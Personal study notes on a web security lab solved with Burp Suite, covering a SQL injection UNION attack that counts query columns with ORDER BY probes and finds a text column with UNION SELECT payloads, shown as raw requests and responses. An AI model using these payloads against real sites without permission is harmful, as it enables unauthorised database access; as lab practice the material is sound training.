# Burp Suite Notes - SQL injection UNION attack, finding a column containing text

## Objective
Replicate the same lab using Burp Suite instead of browser DevTools

## Environment

- **Modules used:** Proxy (intercept) + Repeater

## Step-by-step

### 1. Determine the number of columns

**Request:**
`GET /filter?category=Gifts'+ORDER+BY+4-- HTTP/2`

**Response:** `HTTP/2 500 Internal Server Error`
→ Confirmed the query has fewer than 4 columns.

**Request:**
`GET /filter?category=Gifts'+ORDER+BY+3-- HTTP/2`

**Response:** `HTTP/2 200 OK`
→ The query has exactly **3 columns**.

### 2. Find the column that accepts text

**Payload 1 (column 1):**
`GET /filter?category=Gifts'+UNION+SELECT+'jANXrQ',NULL,NULL-- HTTP/2`

**Response:** `HTTP/2 500 Internal Server Error`
→ Column 1 is not a string type.

**Payload 2 (column 2):**
`GET /filter?category=Gifts'+UNION+SELECT+NULL,'jANXrQ',NULL-- HTTP/2`

**Response:** `HTTP/2 200 OK`
→ Column 2 accepts strings. The value `jANXrQ` appeared in the HTML table.

## Key Observations
- The raw HTML response in Burp Repeater may still show "Not solved" even after the lab is solved. This is because the Repeater shows the response at the time of that specific request. The browser receives the updated session state on the next page load.
- Using `+` instead of spaces in the query string is equivalent and avoids URL-encoding issues.
- Burp Repeater makes it easy to compare responses side-by-side and search for injected values in the HTML.

## Takeaway
The Burp workflow is: **Proxy (capture) → Repeater (edit + resend)**. This gives me more control, a permanent history, and faster iteration compared to browser DevTools. I will use this as my primary tool for future SQLi labs.